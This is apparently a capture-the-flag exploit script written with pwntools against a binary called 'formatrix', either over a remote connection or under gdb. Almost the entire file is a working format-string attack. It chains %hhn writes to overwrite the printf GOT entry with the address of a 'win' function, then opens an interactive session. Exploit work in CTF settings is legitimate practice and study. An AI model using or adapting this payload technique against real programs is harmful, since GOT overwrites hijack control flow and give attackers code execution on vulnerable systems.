# printf: 0x403580
# win: 0x4011d6


from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 4001)
    # p = process('./formatrix')
else:
    # p fget pws *loop+179
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./formatrix',
                  gdbscript='''
                  b *0x401319
                  c
                  ''')

# win_addr = p64(0x4011d6)
prinf_addr_str = "0x403580"
prinf_int = int(prinf_addr_str, 16)

# payload = b"%134$lln"
# payload += p64(prinf_int)

payload = (b"%211c...")  # 133th -> 214 -> 0xd6
payload += (b"%143$hhn")  # 134th

payload += (b"%55c....")  # 135th -> 0x11 + 256 -214 = 59 -> 0x11
payload += (b"%144$hhn")  # 136

payload += (b"%43c....")  # 137th -> 0x40 - 0x11 =  47
payload += (b"%145$hhn")  # 138

payload += (b"%189c...")  # 139th -> 0x00 + 256 - 0x40 = 192
payload += (b"%146$hhn")  # 140th

payload += (b"%147$hhn")  # 141th
payload += (b"%148$hhn")  # 142th

payload += p64(prinf_int)  # 143
payload += p64(prinf_int + 1)  # 144
payload += p64(prinf_int + 2)  # 145
payload += p64(prinf_int + 3)  # 146
payload += p64(prinf_int + 4)  # 147
payload += p64(prinf_int + 5)  # 148

print('payload:', payload)

p.sendlineafter(b': ', payload)

p.interactive()
